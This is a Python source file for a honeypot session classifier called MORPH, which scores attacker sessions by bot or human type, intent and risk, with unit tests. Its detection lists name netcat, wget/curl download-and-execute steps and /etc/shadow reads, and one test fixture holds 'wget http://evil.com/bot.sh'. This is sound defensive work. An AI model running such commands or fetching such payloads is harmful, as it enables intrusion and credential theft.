#!/usr/bin/env python3
"""
MORPH - Rule-Based Session Classifier

Classifies honeypot sessions by type (bot/human), intent, and risk level.
"""

from typing import Any

# Pattern definitions
RECON_COMMANDS = [
    "whoami", "uname", "ifconfig", "ip addr", "ip a", "ls", "cat /etc/passwd",
    "cat /etc/shadow", "id", "hostname", "pwd", "env", "printenv", "ps", "netstat",
    "ss", "df", "free", "uptime", "w", "last", "history", "cat /proc/cpuinfo",
]

EXPLOIT_COMMANDS = [
    "wget", "curl", "chmod +x", "chmod 777", "chmod 755", "./", "python -c",
    "python3 -c", "perl -e", "bash -c", "sh -c", "/tmp/", "base64 -d",
    "nc ", "netcat", "ncat", "tftp", "ftp ",
]

PERSISTENCE_COMMANDS = [
    "crontab", "~/.bashrc", ".bashrc", ".profile", "adduser", "useradd",
    "ssh-keygen", "authorized_keys", ".ssh/", "passwd", "sudoers",
    "/etc/init.d", "systemctl enable", "rc.local", "chkconfig",
]

SCANNER_PATTERNS = [
    "nmap", "masscan", "zmap", "nikto", "sqlmap", "hydra", "medusa",
    "gobuster", "dirb", "dirbuster", "wpscan", "nuclei",
]

BOT_COMMAND_SEQUENCES = [
    ["uname -a", "cat /etc/passwd", "cat /proc/cpuinfo"],
    ["cd /tmp", "wget"],
    ["cd /tmp", "curl"],
    ["chmod +x", "./"],
]

# Known scanner fingerprints - commands appearing together indicate bot
SCANNER_FINGERPRINTS = [
    {"whoami", "id", "uname"},
]

# Common bot passwords
COMMON_BOT_PASSWORDS = ["admin", "root", "123", "password", "test", "1234", "12345", "123456"]

# Interactive commands that suggest human
INTERACTIVE_COMMANDS = ["nano", "vim", "vi", "less", "more", "man", "top", "htop"]


def _command_contains(commands: list[str], patterns: list[str]) -> list[str]:
    """Return list of patterns found in any command."""
    matched = []
    for pattern in patterns:
        for cmd in commands:
            if pattern.lower() in cmd.lower():
                matched.append(pattern)
                break
    return matched


def _check_sequence(commands: list[str], sequence: list[str]) -> bool:
    """Check if commands contain a sequence in order."""
    if not sequence or not commands:
        return False
    seq_idx = 0
    for cmd in commands:
        if sequence[seq_idx].lower() in cmd.lower():
            seq_idx += 1
            if seq_idx >= len(sequence):
                return True
    return False


def classify_session(session: dict[str, Any]) -> dict[str, Any]:
    """
    Classify a honeypot session based on behavior patterns.

    Args:
        session: Dict with keys: commands, login_attempts, downloads, duration_seconds

    Returns:
        Dict with keys:
        - type: "bot" or "human"
        - intent: "recon", "exploit", or "persistence"
        - risk: "low", "medium", or "high"
        - matched_rules: list of triggered rule names
    """
    commands = session.get("commands", [])
    login_attempts = session.get("login_attempts", [])
    downloads = session.get("downloads", [])
    duration = session.get("duration_seconds", 0)

    matched_rules: list[str] = []
    
    # Scoring accumulators
    bot_score = 0
    human_score = 0
    recon_score = 0
    exploit_score = 0
    persistence_score = 0

    # === TYPE CLASSIFICATION (bot vs human) ===

    # Rule 1: Rapid command rate (bot indicator)
    if commands:
        commands_per_second = len(commands) / max(duration, 1)
        if commands_per_second > 1.5:
            bot_score += 5
            matched_rules.append(f"rapid_commands:{commands_per_second:.2f}/sec")

    # Rule 2: Repeated identical commands - loop behavior (bot indicator)
    if commands:
        from collections import Counter
        cmd_counts = Counter(commands)
        repeated_cmds = [cmd for cmd, count in cmd_counts.items() if count >= 3]
        if repeated_cmds:
            bot_score += 4
            matched_rules.append(f"repeated_commands:{repeated_cmds[0]}({cmd_counts[repeated_cmds[0]]}x)")

    # Rule 3: Known scanner command sequences (bot indicator)
    for seq in BOT_COMMAND_SEQUENCES:
        if _check_sequence(commands, seq):
            bot_score += 5
            matched_rules.append(f"scanner_sequence:{seq[0]}...")
            break

    # Rule 3b: Scanner fingerprints - commands appearing together
    cmd_lower_set = {c.lower().split()[0] if c.strip() else "" for c in commands}
    for fingerprint in SCANNER_FINGERPRINTS:
        if fingerprint.issubset(cmd_lower_set):
            bot_score += 4
            matched_rules.append(f"scanner_fingerprint:{','.join(fingerprint)}")
            break

    # Rule 4: Login attempt analysis (bot indicator)
    if len(login_attempts) > 5:
        bot_score += 3
        matched_rules.append(f"many_login_attempts:{len(login_attempts)}")

    # Rule 4b: Check if all passwords are common bot passwords
    if login_attempts:
        passwords = [a.get("password", "").lower() for a in login_attempts]
        bot_passwords = sum(1 for p in passwords if any(common in p for common in COMMON_BOT_PASSWORDS))
        if bot_passwords == len(passwords) and len(passwords) >= 2:
            bot_score += 3
            matched_rules.append("common_bot_passwords")

    # Check for scanner patterns in commands
    scanner_matches = _command_contains(commands, SCANNER_PATTERNS)
    if scanner_matches:
        bot_score += 3
        matched_rules.append(f"scanner_patterns:{','.join(scanner_matches)}")

    # Rule 5: Human indicators (can override bot signals)
    
    # 5a: Long duration with varied commands = human
    if duration > 60 and commands:
        unique_ratio = len(set(commands)) / len(commands)
        if unique_ratio > 0.5:
            human_score += 4
            matched_rules.append("long_varied_session")

    # 5b: Interactive commands suggest human
    interactive_found = []
    for cmd in commands:
        cmd_base = cmd.strip().split()[0] if cmd.strip() else ""
        if cmd_base in INTERACTIVE_COMMANDS:
            interactive_found.append(cmd_base)
    if interactive_found:
        human_score += 2
        matched_rules.append(f"interactive_commands:{','.join(set(interactive_found))}")

    # Exploratory behavior (cd, ls combinations)
    cd_count = sum(1 for c in commands if c.strip().startswith("cd "))
    ls_count = sum(1 for c in commands if "ls" in c.lower())
    if cd_count > 2 and ls_count > 2:
        human_score += 2
        matched_rules.append("exploratory_behavior")

    # === INTENT CLASSIFICATION ===

    # Check for recon commands
    recon_matches = _command_contains(commands, RECON_COMMANDS)
    if recon_matches:
        recon_score += len(recon_matches)
        matched_rules.append(f"recon_commands:{','.join(recon_matches[:3])}")

    # Check for exploit commands
    exploit_matches = _command_contains(commands, EXPLOIT_COMMANDS)
    if exploit_matches:
        exploit_score += len(exploit_matches) * 2
        matched_rules.append(f"exploit_commands:{','.join(exploit_matches[:3])}")

    # Check for persistence commands
    persistence_matches = _command_contains(commands, PERSISTENCE_COMMANDS)
    if persistence_matches:
        persistence_score += len(persistence_matches) * 3
        matched_rules.append(f"persistence_commands:{','.join(persistence_matches[:3])}")

    # Downloads boost exploit score
    if downloads:
        exploit_score += len(downloads) * 2
        matched_rules.append(f"downloads:{len(downloads)}")

    # === RISK CLASSIFICATION ===

    risk_score = 0

    # Downloads are risky
    if downloads:
        risk_score += 2
        matched_rules.append("has_downloads")

    # Execution attempts
    execution_patterns = ["./", "python -c", "perl -e", "bash -c", "sh -c", "chmod +x"]
    exec_matches = _command_contains(commands, execution_patterns)
    if exec_matches:
        risk_score += 2
        matched_rules.append("execution_attempts")

    # Download + execution = very risky
    if downloads and exec_matches:
        risk_score += 2
        matched_rules.append("download_and_execute")

    # Persistence is high risk
    if persistence_matches:
        risk_score += 3
        matched_rules.append("persistence_risk")

    # Credential harvesting
    shadow_access = any("/etc/shadow" in c for c in commands)
    if shadow_access:
        risk_score += 2
        matched_rules.append("shadow_access")

    # Privilege escalation attempts
    priv_esc = any(p in " ".join(commands).lower() for p in ["sudo", "su -", "su root"])
    if priv_esc:
        risk_score += 1
        matched_rules.append("privilege_escalation")

    # === DETERMINE FINAL CLASSIFICATIONS ===

    # Type
    session_type = "bot" if bot_score > human_score else "human"
    
    # Intent (highest score wins)
    intent_scores = {
        "recon": recon_score,
        "exploit": exploit_score,
        "persistence": persistence_score,
    }
    intent = max(intent_scores, key=intent_scores.get)  # type: ignore
    
    # Default to recon if no clear intent
    if all(s == 0 for s in intent_scores.values()):
        intent = "recon"

    # Risk level
    if risk_score >= 5:
        risk = "high"
    elif risk_score >= 2:
        risk = "medium"
    else:
        risk = "low"

    return {
        "type": session_type,
        "intent": intent,
        "risk": risk,
        "matched_rules": matched_rules,
    }


def test_bot_detection():
    """Unit tests for bot detection logic."""
    print("=" * 60)
    print("MORPH Bot Detection Unit Tests")
    print("=" * 60)
    
    passed = 0
    failed = 0
    
    # Test 1 - Bot by speed
    session1 = {
        "commands": ["uname -a", "whoami", "id", "cat /etc/passwd",
                     "cat /proc/cpuinfo", "ls", "pwd", "wget http://evil.com/bot.sh"],
        "duration_seconds": 3,
        "login_attempts": [],
        "downloads": [],
    }
    result1 = classify_session(session1)
    rule_match = any("rapid_commands" in r for r in result1["matched_rules"])
    
    print("\nTest 1 - Bot by speed:")
    print(f"  Commands: 8 in 3 seconds")
    print(f"  Result: type={result1['type']}, rules={result1['matched_rules']}")
    if result1["type"] == "bot" and rule_match:
        print("  ✓ PASS")
        passed += 1
    else:
        print("  ✗ FAIL - Expected type=bot with rapid_commands rule")
        failed += 1
    
    # Test 2 - Bot by scanner sequence
    session2 = {
        "commands": ["uname -a", "cat /etc/passwd", "cat /proc/cpuinfo"],
        "duration_seconds": 30,
        "login_attempts": [],
        "downloads": [],
    }
    result2 = classify_session(session2)
    rule_match = any("scanner_sequence" in r for r in result2["matched_rules"])
    
    print("\nTest 2 - Bot by scanner sequence:")
    print(f"  Commands: uname -a → cat /etc/passwd → cat /proc/cpuinfo")
    print(f"  Result: type={result2['type']}, rules={result2['matched_rules']}")
    if result2["type"] == "bot" and rule_match:
        print("  ✓ PASS")
        passed += 1
    else:
        print("  ✗ FAIL - Expected type=bot with scanner_sequence rule")
        failed += 1
    
    # Test 3 - Human
    session3 = {
        "commands": ["ls", "cd /var/www", "cat index.html", "vim config.php"],
        "duration_seconds": 120,
        "login_attempts": [],
        "downloads": [],
    }
    result3 = classify_session(session3)
    
    print("\nTest 3 - Human:")
    print(f"  Commands: ls, cd, cat, vim over 120 seconds")
    print(f"  Result: type={result3['type']}, rules={result3['matched_rules']}")
    if result3["type"] == "human":
        print("  ✓ PASS")
        passed += 1
    else:
        print("  ✗ FAIL - Expected type=human")
        failed += 1
    
    # Summary
    print("\n" + "=" * 60)
    print(f"Results: {passed} passed, {failed} failed")
    print("=" * 60)
    
    return failed == 0


if __name__ == "__main__":
    test_bot_detection()
